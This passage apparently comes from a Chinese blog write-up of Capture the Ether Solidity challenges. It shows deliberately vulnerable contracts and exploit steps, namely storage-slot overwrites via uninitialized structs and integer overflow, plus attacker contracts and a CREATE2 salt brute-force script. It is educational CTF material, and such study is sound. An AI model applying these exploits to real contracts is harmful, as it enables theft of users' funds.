class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        &#x2F;&#x2F; amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale &#x3D; 10**18 * 1 ether;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; etherAmount &#x2F; scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp &#x3D; now;</span><br><span class="line">        donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=_AUXpnB065o">Space Force</a>.</p><p><strong>解题：</strong></p><p>这也是一个变量覆盖题目。  Struct在函数内非显式地初始化的时候会使用storage存储而不是memory。具体讲就是 <code>donate()</code> 中 <code>donation</code> 定义时未指定引用，默认指向 slot0 。 因此我们可覆盖solt 0和slot 1处1存储的状态变量，恰好solt 1存储的即为owner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Donation donation;</span><br><span class="line">donation.timestamp &#x3D; now;</span><br><span class="line">donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">now覆盖slot(0) etherAmount覆盖slot(1) 利用etherAmount覆盖owner</span><br></pre></td></tr></table></figure><p>我们需要将 owner 覆盖为我们的账户， 然后将 balance 取出。</p><p>攻击： 设置 value 满足要求，即  <code>address // 10**36</code> , 设置 etherAmount 的值为我的地址</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png"></a></p><p>攻击后：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png"></a></p><p>这样我就可以将 balance 全部取出了。</p><h3 id="6-Fifty-years"><a href="#6-Fifty-years" class="headerlink" title="6. Fifty years"></a>6. Fifty years</h3><p><strong>题目描述：</strong></p><p>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.</p><p>All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        owner &#x3D; player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;&#x3D; head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            &#x2F;&#x2F; Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution &#x3D; queue[index];</span><br><span class="line">            contribution.amount +&#x3D; msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; Append a new contribution. Require that each contribution unlock</span><br><span class="line">            &#x2F;&#x2F; at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;&#x3D; queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount &#x3D; msg.value;</span><br><span class="line">            contribution.unlockTimestamp &#x3D; timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        require(now &gt;&#x3D; queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total &#x3D; 0;</span><br><span class="line">        for (uint256 i &#x3D; head; i &lt;&#x3D; index; i++) &#123;</span><br><span class="line">            total +&#x3D; queue[i].amount;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Move the head of the queue forward so we don&#39;t have to loop over</span><br><span class="line">        &#x2F;&#x2F; already-withdrawn contributions.</span><br><span class="line">        head &#x3D; index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tR-qQcNT_fY">100 Years</a>. I guess just listen to half of it.</p><p><strong>解题：</strong></p><p>通过前面几天题，我可以知道以下暂时可以得到信息：</p><ol><li><p>函数里使用了storage存储来初始化一个contribution结构体， 因此我们可以覆盖 queue 的长度以及 head 的值。</p><pre><code>   msg.value覆盖slot(0) -&gt; queue.length   timestamp覆盖slot(1) -&gt; head</code></pre></li><li><p>溢出漏洞： <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code></p><p>queue 的长度可控， 动态数组queue 的变量所在的存储位计算规则为 <code>keccak256(slot) + index * elementsize</code> ,  <code>elementsize</code>  即为结构体Contribution的size</p></li></ol><p>利用思路：</p><ol><li><p>启动合约，此时 queue.length =1， head = 0</p></li><li><p>调用 <code>upsert(1, 2**256-24*60*60)</code>  通过溢出绕过 <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code> 检查，即 2**256 + 24 * 60 * 60 = 0；</p><p>此时 queue.length = 1 &amp; head = 2*<em>256-24</em>60*60</p></li><li><p>再调用一次 upsert(2, 0) , 调用后, queue.length = 2 &amp; head = 0</p></li><li><p>最后取出所有 balance <code>withdraw(2)</code></p></li></ol><p>step1:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png"></a></p><p>step: 2</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png"></a></p><p>然后在执行withraw 的时候发现失败了，通过调试以及查阅资料发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contribution的amount值并不是我们传递的msg.value的值，在其基础上还加了1.开始我也不太明白，后来debug发现原来queue.length也是msg.value+1，因为二者共用一块存储，应该是queue.length增加时也修改了amount的值，至于此处queue.length为何+1，则是因为queue.push操作，因为其在最后执行增添对象的任务，添加以后它会将queue.length进行+1操作</span><br><span class="line"></span><br><span class="line">这样一切就解释的通了，关键就是这里amount进行了+1，所以在withdraw是所统计的total事实上是大于合约所拥有的balance，所以transfer无法执行，这一点确实有点难到我了，必须想个办法抵消这一步+1的操作</span><br><span class="line"></span><br><span class="line">很快，我意识到我可以利用value来覆盖已有的contribution，既然发1 wei会加1，那我发两次，这样得到的amount就是2，也就是我实际发送的wei数目，所以把上面那两步写入操作都改成1 wei下的操作即可 。</span><br></pre></td></tr></table></figure><p><strong>参考资料：</strong></p><p><a href="https://www.anquanke.com/post/id/153375#h3-11">capture the ether write up(warmup and Math) - 安全客，安全资讯平台 (anquanke.com)</a></p><h2 id="Account"><a href="#Account" class="headerlink" title="Account"></a>Account</h2><h3 id="1-Fuzzy-identity"><a href="#1-Fuzzy-identity" class="headerlink" title="1. Fuzzy identity"></a>1. Fuzzy identity</h3><p><strong>题目描述：</strong></p><p>This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:</p><ol><li> I always use a wallet contract that returns “smarx” if you ask its <code>name</code>.</li><li> Everything I write has bad code in it, so my address always includes the hex string <code>badc0de</code>.</li></ol><p>To complete this challenge, steal my identity!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() &#x3D;&#x3D; bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr &#x3D; bytes20(_addr);</span><br><span class="line">        bytes20 id &#x3D; hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask &#x3D; hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask &#x3D;&#x3D; id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;&#x3D; 4;</span><br><span class="line">            id &lt;&lt;&#x3D; 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=8wxBLq_C2KQ">Research Me Obsessively</a>.</p><p><strong>解题：</strong></p><p>题目要求：</p><ol><li> <code> IName(addr).name() == bytes32(&quot;smarx&quot;);</code></li><li>  地址中要存在  <code>badc0de</code></li></ol><p>通过查阅资料可以知道：</p><p>参考黄皮书公式(81)，部署合约时，目标地址有两种计算方式，分别为 <code>CREATE</code> 和 <code>CREATE2</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png"></a></p><p>我们通过 <code>CREATE2</code> 爆破salt计算合约地址，包含badc0de即可</p><ol><li>部署攻击合约的部署合约利用create2获取包含特定字符的攻击合约地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.12;</span><br><span class="line">contract FuzzyIdentitySolverDeployer &#123;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code, uint256 salt) public</span><br><span class="line">returns(address) &#123;</span><br><span class="line"></span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line"></span><br><span class="line">          addr :&#x3D; create2(0, add(code, 0x20), mload(code), salt)</span><br><span class="line">          if iszero(extcodesize(addr)) &#123;</span><br><span class="line"></span><br><span class="line">            revert(0, 0)</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署上述合约并获取合约地址： </p><ol start="2"><li> 编译攻击合约代码， 并获取攻击合约代码的 bytecode</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IFuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function authenticate() external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function name() public pure returns (bytes32) &#123;</span><br><span class="line"></span><br><span class="line">        return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public &#123;</span><br><span class="line">        IFuzzyIdentityChallengeSolver(_addr).authenticate();</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;linkReferences&quot;</span>: &#123;&#125;,</span><br><span class="line"><span class="attr">&quot;object&quot;</span>: <span class="string">&quot;608060405234801561001057600080fd5b5061019a806100206000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610084575b600080fd5b34801561005d57600080fd5b506100666100c7565b60405180826000191660001916815260200191505060405180910390f35b34801561009057600080fd5b506100c5600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100ef565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b50505050505600a165627a7a723058208dfe2548775f3de8273867b8111a10cf9a9ad2fbde6b7c8d41ececc20f7367380029&quot;</span>,</span><br><span class="line"><span class="attr">&quot;opcodes&quot;</span>: <span class="string">&quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x84 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xEF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH32 0x736D617278000000000000000000000000000000000000000000000000000000 SWAP1 POP SWAP1 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x380C7A67 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x167 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 DUP14 INVALID 0x25 0x48 PUSH24 0x5F3DE8273867B8111A10CF9A9AD2FBDE6B7C8D41ECECC20F PUSH20 0x6738002900000000000000000000000000000000 &quot;</span>,</span><br><span class="line"><span class="attr">&quot;sourceMap&quot;</span>: <span class="string">&quot;107:239:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;107:239:0;;;;;;;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]计算攻击合约地址</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="comment"># CREATE2</span></span><br><span class="line"><span class="comment"># keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create2</span>(<span class="params">deployer, salt_hexstr, hashed_bytecode</span>):</span></span><br><span class="line">    addr_hexbytes = Web3.keccak(hexstr=(<span class="string">&#x27;ff&#x27;</span> + deployer + salt_hexstr +</span><br><span class="line">hashed_bytecode))</span><br><span class="line">    addr = Web3.toHex(addr_hexbytes)[-<span class="number">40</span>:]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"><span class="comment"># expecting deployer=&#x27;aabbccdd&#x27; (20 bytes -&gt; 40 characters)</span></span><br><span class="line"><span class="comment"># salt = some decimal number</span></span><br><span class="line"><span class="comment"># bytecode = &#x27;aabbccddeeff...&#x27; (variable length)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2</span>(<span class="params">deployer, salt, bytecode</span>):</span></span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(deployer) == <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(bytecode) % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">    salt_hexstr = <span class="built_in">hex</span>(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2_search</span>(<span class="params">deployer, predicate, bytecode</span>):</span></span><br><span class="line">    salt = <span class="number">0</span></span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        salt += <span class="number">1</span></span><br><span class="line">        salt_hexstr = <span class="built_in">hex</span>(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">        addr = _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line">        <span class="keyword">if</span> salt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;.&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> predicate(addr):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nFound a match after <span class="subst">&#123;salt&#125;</span> attempts: <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> deployer_addr &lt;salt |predicate&gt; bytecode&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;When passing a salt value, this script prints theaddress of the newly deployed contract based on the deployer address andbytecode hash.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE 42 602a60205260206020f3&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;When passing a predicate, this script will search for a salt value such that the new address satisfies the predicate.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE &#x27;lambda addr: \&quot;badc0de\&quot; inaddr.lower()&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Another predicate that may be useful: &#x27;lambda addr:addr.startswith(\&quot;0\&quot; * 8)&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    deployer_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> deployer_addr.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        deployer_addr = deployer_addr[<span class="number">2</span>:]</span><br><span class="line">    bytecode = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        salt = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(create2(deployer_addr, salt, bytecode))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        predicate = <span class="built_in">eval</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">        create2_search(deployer_addr, predicate, bytecode)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><pre><code>通过计算出来的合约攻击目标地址</code></pre><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png"></a></p><h3 id="2-Public-Key"><a href="#2-Public-Key" class="headerlink" title="2. Public Key"></a>2. Public Key</h3><p><strong>题目描述：</strong></p><p>Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key.</p><p>To complete this challenge, find the public key for the <code>owner</code>‘s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 